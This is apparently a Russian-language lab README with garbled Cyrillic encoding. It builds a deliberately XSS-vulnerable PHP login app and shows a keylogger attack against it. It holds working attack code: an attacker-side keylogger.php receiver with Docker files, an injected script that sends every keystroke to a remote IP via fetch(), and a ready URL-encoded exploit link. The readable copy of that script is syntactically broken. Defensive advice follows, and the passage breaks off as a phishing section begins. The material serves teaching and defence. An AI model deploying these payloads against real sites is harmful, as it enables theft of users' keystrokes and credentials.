    <form method="POST">
        <label>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</label><br>
        <input type="text" name="username" required><br><br>

        <label>–ü–∞—Ä–æ–ª—å:</label><br>
        <input type="password" name="password" required><br><br>
        
        <label>–û —Å–µ–±–µ (bio):</label><br>
        <textarea name="bio" rows="4" cols="50" placeholder="–†–∞—Å—Å–∫–∞–∂–∏ –æ —Å–µ–±–µ"></textarea><br><br>
        
        <input type="submit" value="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è">
    </form>
    <p>–£–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã? <a href="login.php">–í–æ–π—Ç–∏</a></p>
</body>
</html>
```

### `html/login.php`

```php
<?php
session_start();
require 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = :username";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':username', $username);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // ‚ö†Ô∏è –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–æ: —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å –æ—Ç–∫—Ä—ã—Ç—ã–º —Ç–µ–∫—Å—Ç–æ–º
    if ($user && $user['password'] === $password) {
        $_SESSION['username'] = $username;
        header("Location: dashboard.php");
        exit();
    } else {
        $error = "–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å";
    }
}

// ‚ö†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å XSS: –≤—ã–≤–æ–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
if (isset($_GET['payload'])) {
    echo $_GET['payload'];
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–í—Ö–æ–¥</title>
</head>
<body>
    <h1>–í—Ö–æ–¥</h1>
    <?php if(isset($error)) { echo "<p style='color:red;'>" . $error . "</p>"; } ?>
    <form method="POST">
        <label>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</label><br>
        <input type="text" name="username" required><br><br>
        
        <label>–ü–∞—Ä–æ–ª—å:</label><br>
        <input type="password" name="password" required><br><br>
        
        <input type="submit" value="–í–æ–π—Ç–∏">
    </form>
    <p>–ù–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? <a href="register.php">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a></p>
</body>
</html>
```

### `html/dashboard.php`

```php
<?php
session_start();
require 'db.php';

if (!isset($_SESSION['username'])) {
    header("Location: login.php");
    exit();
}

$username = $_SESSION['username'];

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ bio
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newBio = $_POST['bio'] ?? '';
    $sql = "UPDATE users SET bio = :bio WHERE username = :username";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':bio', $newBio);
    $stmt->bindValue(':username', $username);
    $stmt->execute();
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø—Ä–æ—Ñ–∏–ª—è
$sql = "SELECT * FROM users WHERE username = :username";
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':username', $username);
$stmt->execute();
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    header("Location: login.php");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç</title>
</head>
<body>
    <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, <?php echo htmlspecialchars($user['username']); ?>!</h1>

    <?php
    // ‚ö†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å XSS: –≤—ã–≤–æ–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    if (isset($_GET['payload'])) {
        echo $_GET['payload'];
    }
    ?>

    <p><strong>–û —Å–µ–±–µ (bio):</strong> <?php echo $user['bio']; ?></p>

    <h2>–†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å ¬´–û —Å–µ–±–µ¬ª</h2>
    <form method="POST">
        <textarea name="bio" rows="4" cols="50"><?php echo $user['bio']; ?></textarea><br>
        <input type="submit" value="–°–æ—Ö—Ä–∞–Ω–∏—Ç—å">
    </form>

    <p><a href="logout.php">–í—ã–π—Ç–∏</a></p>
</body>
</html>
```

### `html/logout.php`

```php
<?php
session_start();
session_destroy();
header("Location: index.php");
exit();
```

---

## üóÉ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ë–î (—á–µ—Ä–µ–∑ pgAdmin –∏–ª–∏ psql)

**–°—Ö–µ–º–∞ –∏ —Ç–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:**

```sql
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(64) UNIQUE NOT NULL,
  password VARCHAR(255) NOT NULL,
  bio TEXT DEFAULT ''
);
```
## –í —Ä–∞–º–∫–∞—Ö –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –ø–∞—Ä–æ–ª–∏ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ, –æ—á–µ–≤–∏–¥–Ω–æ, —á—Ç–æ —Ç–∞–∫ –Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å, –¥–æ–ø—É—Å—Ç–∏–º, —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è

**–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —Å —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ–º –ø–∞—Ä–æ–ª—è**
```
// –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–æ–ª—å –∏–∑ —Ñ–æ—Ä–º—ã
$password = $_POST['password'];

// –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ö—ç—à —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ª–≥–æ—Ä–∏—Ç–º–∞ bcrypt
$passwordHash = password_hash($password, PASSWORD_BCRYPT);

// –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –ë–î
$sql = "INSERT INTO users (username, password_hash, bio) VALUES (:username, :password_hash, :bio)";
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':username', $username);
$stmt->bindValue(':password_hash', $passwordHash);
$stmt->bindValue(':bio', $bio);
$stmt->execute();

```
**–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –ø–∞—Ä–æ–ª—è**
```
$sql = "SELECT * FROM users WHERE username = :username";
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':username', $username);
$stmt->execute();
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user && password_verify($password, $user['password_hash'])) {
    $_SESSION['username'] = $username;
    header("Location: dashboard.php");
    exit();
} else {
    $error = "–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å";
}
```
**–¢–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –±–µ–∑–æ–ø–∞—Å–Ω—ã–º —Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –ø–∞—Ä–æ–ª—è**
```
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(64) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  bio TEXT DEFAULT ''
);
```

> –ß–µ—Ä–µ–∑ **pgAdmin** –ø–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –∫ —Ö–æ—Å—Ç—É `db:5432` (–∏–∑–Ω—É—Ç—Ä–∏ —Å–µ—Ç–∏ Docker) –∏–ª–∏ –∫ `localhost:1111` PgAdmin4 —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä. –ü–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –ë–î `anubis`, –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç–µ SQL –¥–ª—è —Ç–∞–±–ª–∏—Ü—ã `users`.

---

## ‚ñ∂Ô∏è –ó–∞–ø—É—Å–∫ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞

1. –°–æ–±—Ä–∞—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã:

   ```bash
   docker compose up -d --build
   ```
2. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ –≤ —Ä–µ–∂–∏–º–µ CLI
```bash
root@dock:~# docker ps -a
CONTAINER ID   IMAGE                   COMMAND                  CREATED          STATUS          PORTS
                            NAMES
404652693b31   dpage/pgadmin4:latest   "/entrypoint.sh"         42 minutes ago   Up 42 minutes   443/tcp, 0.0.0.0:1111->80/tcp, [::]:1111->80/tcp   pgadmin
312c834e57dc   test-xss-php            "docker-php-entrypoi‚Ä¶"   42 minutes ago   Up 42 minutes   0.0.0.0:2222->80/tcp, [::]:2222->80/tcp            test-xss-php-1
4e5491887cbc   postgres:latest         "docker-entrypoint.s‚Ä¶"   42 minutes ago   Up 42 minutes   0.0.0.0:5432->5432/tcp, [::]:5432->5432/tcp        postgres_db
root@dock:~#
```
3. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Å–µ—Ä–≤–∏—Å–æ–≤:

   * –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ: `http://<ip>:2222`
   * pgAdmin: `http://<ip>:1111`
4. –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –≤–æ–π—Ç–∏ –≤ **–õ–ö**.
5. –£–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –ø–∞—Ä–∞–º–µ—Ç—Ä `payload` –æ—Ç—Ä–∏—Å–æ–≤—ã–≤–∞–µ—Ç—Å—è *–∫–∞–∫ –µ—Å—Ç—å*, –Ω–∞–ø—Ä–∏–º–µ—Ä:

   ```
   http://<ip>:2222/login.php?payload=<script>alert('xss')</script>
   ```

### üõ† –≠—Ç–∞–ø 2 ‚Äî –°–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞: –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è —Å–±–æ—Ä–∞ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à

–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ: –ø—Ä–∏–Ω—è—Ç—å `POST` –æ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ JS –∏ –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à –≤ `keylog.txt`.

#### üì¶ Docker Compose (–º–∞—à–∏–Ω–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞)
```yaml
version: '3.8'

services:
  keylogger:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: keylogger_server
    ports:
      - "3333:80"
    # (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ) —Å–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–≥–∏ –Ω–∞ —Ö–æ—Å—Ç–µ:
    # volumes:
    #   - ./logs:/var/www/html
```
üß± Dockerfile
```
FROM php:8.1-apache

# –ö–æ–ø–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫
COPY keylogger.php /var/www/html/keylogger.php

# –ü—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å—å –¥–ª—è —Ñ–∞–π–ª–∞ –ª–æ–≥–æ–≤
RUN chown -R www-data:www-data /var/www/html
```

üóÉ keylogger.php

```
<?php // keylogger.php ‚Äî —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à 
if ($_SERVER['REQUEST_METHOD'] == 'POST') { 
  $key = isset($_POST['key']) ? $_POST['key'] : ''; 
  $log_entry = "Key: " . $key . " at " . date("Y-m-d H:i:s") . "\n";
  file_put_contents('keylog.txt', $log_entry, FILE_APPEND);
}
?>
```

keylogger.php ‚Äì —ç—Ç–æ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π PHP-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–π –Ω–∞ –º–∞—à–∏–Ω–µ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞. –°–∫—Ä–∏–ø—Ç –ø—Ä–∏–Ω–∏–º–∞–µ—Ç HTTP-–∑–∞–ø—Ä–æ—Å—ã –º–µ—Ç–æ–¥–æ–º POST —Å –ø–æ–ª–µ–º key, —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç —Å—Ç—Ä–æ–∫—É –∂—É—Ä–Ω–∞–ª–∞ –≤–∏–¥–∞ Key: <—Å–∏–º–≤–æ–ª> at <YYYY-MM-DD HH:MM:SS> –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –µ—ë –≤ —Ñ–∞–π–ª keylog.txt, —Ñ–∞–π–ª —Å–æ–∑–¥–∞—ë—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –æ–±—Ä–∞—â–µ–Ω–∏–∏. –¢–µ–º —Å–∞–º—ã–º –∫–∞–∂–¥–æ–µ –Ω–∞–∂–∞—Ç–∏–µ –∫–ª–∞–≤–∏—à–∏, –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–µ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∫–ª–∏–µ–Ω—Ç–∞, –º–≥–Ω–æ–≤–µ–Ω–Ω–æ —Ñ–∏–∫—Å–∏—Ä—É–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ –ø–æ–∑–¥–Ω–µ–µ.

–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ URL —Å–∫—Ä–∏–ø—Ç–∞
```
<script>
document.onkeypress = function (e) { 
    var key = e.key
    console.log("–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞: " + key
    fetch("http://192.168.0.114:3333/keylogger.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "key=" + encodeURIComponent(key
    });
};
</script>
```
document.onkeypress ‚Äì —ç—Ç–æ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä –Ω–∞–∑–Ω–∞—á–∞–µ—Ç –≥–ª–æ–±–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à–∏, –±–ª–∞–≥–æ–¥–∞—Ä—è —á–µ–º—É —Å–∫—Ä–∏–ø—Ç —Ä–µ–∞–≥–∏—Ä—É–µ—Ç –Ω–∞ –∫–∞–∂–¥–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ. –í —Ç–µ–ª–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ –æ–ø–µ—Ä–∞—Ç–æ—Ä var key = e.key –∏–∑–≤–ª–µ–∫–∞–µ—Ç –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ —Å–∏–º–≤–æ–ª, –≤–≤–µ–¥—ë–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —á—Ç–æ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç —Ç–æ—á–Ω–æ—Å—Ç—å —Å–æ–±–∏—Ä–∞–µ–º—ã—Ö –¥–∞–Ω–Ω—ã—Ö –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –ª–æ–≥–∏–∫–∏. –í —Å—Ç—Ä–æ–∫–µ console.log ("–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞:" + key) –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è –≤—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ –∫–æ–Ω—Å–æ–ª—å –±—Ä–∞—É–∑–µ—Ä–∞, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç—å —Ä–∞–±–æ—Ç—ã –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –Ω–∞ —ç—Ç–∞–ø–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑ –≤–∏–∑—É–∞–ª—å–Ω–æ–≥–æ –≤–º–µ—à–∞—Ç–µ–ª—å—Å—Ç–≤–∞ –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –¥–∞–Ω–Ω—ã—Ö —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é fetch, –∫–æ—Ç–æ—Ä–∞—è —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç HTTP POST-–∑–∞–ø—Ä–æ—Å –∫ —Å–µ—Ä–≤–µ—Ä–Ω–æ–º—É –ø—Ä–∏—ë–º–Ω–∏–∫—É keylogger.php, –ø–µ—Ä–µ–¥–∞–≤–∞—è –ø–∞—Ä–∞–º–µ—Ç—Ä key –≤ —Ñ–æ—Ä–º–∞—Ç–µ application/x-www-form-urlencoded. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ –∏ —Ö—Ä–∞–Ω–µ–Ω–∏—è –≤ –ª–æ–≥-—Ñ–∞–π–ª–µ.
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –ø–æ —ç—Ç–æ–π —Å—Å—ã–ª–∫–µ, —á—Ç–æ–±—ã –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript –∏—Å–ø–æ–ª–Ω–∏–ª—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ dashboard.php, –∞ –≤—Å–µ –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à –Ω–∞—á–∞–ª–∏ —É—Ö–æ–¥–∏—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π URL**

```
http://192.168.0.69:2222/dashboard.php?payload=%3Cscript%3Edocument.onkeypress%3Dfunction(e)%7Bvar%20key%3De.key%3Bconsole.log(%22%D0%9D%D0%B0%D0%B6%D0%B0%D1%82%D0%B0%20%D0%BA%D0%BB%D0%B0%D0%B2%D0%B8%D1%88%D0%B0%3A%20%22%20%2Bkey)%3Bfetch(%27http%3A%2F%2F192.168.0.114%3A3333%2Fkeylogger.php%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A%27key%3D%27%2BencodeURIComponent(key)%7D)%3B%7D%3B%3C%2Fscript%3E
```

### üé• –í–∏–¥–µ–æ-–¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –∞—Ç–∞–∫–∏
[–°–º–æ—Ç—Ä–µ—Ç—å –≤–∏–¥–µ–æ –≤ Google Drive](https://drive.google.com/file/d/1A0Uh9WIpx9KFe4nZnPX7zDC-92cl0SQB/view?usp=sharing)

## üõ° –ó–∞—â–∏—Ç–∞
–ó–∞—â–∏—Ç–∞ –æ—Ç XSS-–∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
-	–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤ (NoScript, uBlock Origin) –∏ –∑–∞–ø—Ä–µ—â–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–µ–ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ JavaScript;
-	–Ω–µ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –ø–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º —Å—Å—ã–ª–∫–∞–º –∏ —Ç—â–∞—Ç–µ–ª—å–Ω–æ –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∞–¥—Ä–µ—Å–∞ (–æ—Å–æ–±–µ–Ω–Ω–æ –¥–ª–∏–Ω–Ω—ã–µ URL —Å –Ω–µ–∑–Ω–∞–∫–æ–º—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏);
-	–ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –≤–≤–æ–¥–∏—Ç—å –∏—Ö –≤ –æ–∫–Ω–µ ¬´–ò–Ω–∫–æ–≥–Ω–∏—Ç–æ¬ª –∏–ª–∏ –Ω–∞ –∑–∞—â–∏—â—ë–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö –±–µ–∑ –º–∞—Å—Å–æ–≤—ã—Ö —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π;
-	—Ä–µ–≥—É–ª—è—Ä–Ω–æ –æ—á–∏—â–∞—Ç—å –∫—ç—à –∏ –∫—É–∫–∏ –±—Ä–∞—É–∑–µ—Ä–∞, —á—Ç–æ–±—ã —É–¥–∞–ª–∏—Ç—å –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –≤–Ω–µ–¥—Ä—ë–Ω–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç—ã.
–ó–∞—â–∏—Ç–∞ –æ—Ç XSS-–∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
-	–≤–Ω–µ–¥—Ä–∏—Ç—å –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ω–∞–¥—ë–∂–Ω—É—é —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—é –∏ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö –≤—Ö–æ–¥—è—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö, –æ—Å–æ–±–µ–Ω–Ω–æ —Ç–µ—Ö, —á—Ç–æ –ø–æ–ø–∞–¥–∞—é—Ç –≤ HTML;
-	–ø—Ä–∏–º–µ–Ω—è—Ç—å –º–µ—Ö–∞–Ω–∏–∑–º CSP —Å —Å–ø–∏—Å–∫–æ–º –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ —Å–∫—Ä–∏–ø—Ç–æ–≤;
-	–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ –∏ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ (DAST) –¥–ª—è —Å–≤–æ–µ–≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –≤—ã—è–≤–ª–µ–Ω–∏—è XSS-—É—è–∑–≤–∏–º–æ—Å—Ç–µ–π 



## 2 üé≠ –ê—Ç–∞–∫–∞ –º–µ—Ç–æ–¥–æ–º –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ —ç–∫–∑–µ–º–ø–ª—è—Ä–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞ (Phishing —á–µ—Ä–µ–∑ XSS)

–§–∏—à–∏–Ω–≥–æ–≤–∞—è –∞—Ç–∞–∫–∞ –≤ –¥–∞–Ω–Ω–æ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏ —Ä–µ–∞–ª–∏–∑—É–µ—Ç—Å—è —á–µ—Ä–µ–∑ –∫–æ–º–±–∏–Ω–∞—Ü–∏—é —Å–æ—Ü–∏–∞–ª—å–Ω–æ–π –∏–Ω–∂–µ–Ω–µ—Ä–∏–∏ –∏ XSS-–∏–Ω—ä–µ–∫—Ü–∏–∏. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –ø–æ–¥–¥–µ–ª—å–Ω–∞—è —Ñ–æ—Ä–º–∞ –≤—Ö–æ–¥–∞, –ø–æ–ª–Ω–æ—Å—Ç—å—é –∫–æ–ø–∏—Ä—É—é—â–∞—è –æ—Ä–∏–≥–∏–Ω–∞–ª. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä—è–µ—Ç JavaScript-—Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Ä–µ–∞–ª—å–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ –∏–∑–º–µ–Ω—è–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã —Ñ–æ—Ä–º—ã —Ç–∞–∫, 